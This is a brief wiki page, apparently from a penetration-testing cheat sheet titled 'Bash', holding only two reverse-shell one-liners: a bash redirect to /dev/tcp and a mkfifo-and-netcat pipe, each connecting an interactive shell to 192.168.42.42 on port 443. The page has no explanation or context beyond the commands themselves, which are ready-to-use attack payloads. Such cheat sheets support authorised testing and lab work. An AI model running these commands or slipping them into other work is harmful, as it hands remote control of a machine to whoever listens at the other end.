---
title: "Bash"
date: 2025-10-02
draft: false
type: wiki
---

```bash
bash -i >& /dev/tcp/192.168.42.42/443 0>&1
```

-----------------------------

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.42.42 443 >/tmp/f
```

-----------------------------
